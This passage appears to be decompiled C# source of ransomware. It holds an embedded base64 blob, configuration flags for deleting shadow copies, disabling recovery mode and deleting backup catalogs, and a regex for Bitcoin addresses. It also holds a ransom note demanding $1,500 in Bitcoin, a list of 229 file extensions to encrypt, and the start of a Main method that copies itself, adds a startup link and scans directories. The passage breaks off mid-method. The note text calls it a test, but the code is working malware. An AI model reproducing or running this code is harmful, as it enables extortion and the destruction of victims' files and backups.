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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_me.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[23]
	{
		"Whoops! (:", "", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.To get your files back, you can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.", "", "The price for the software is $1,500. Payment can be made in Bitcoin only.", "",
		"How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  Not available you fag", "",
		"", "______THIS IS A TEST RANSOMWARE. OWNER IS NOT SPREADING THIS!!!___________", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
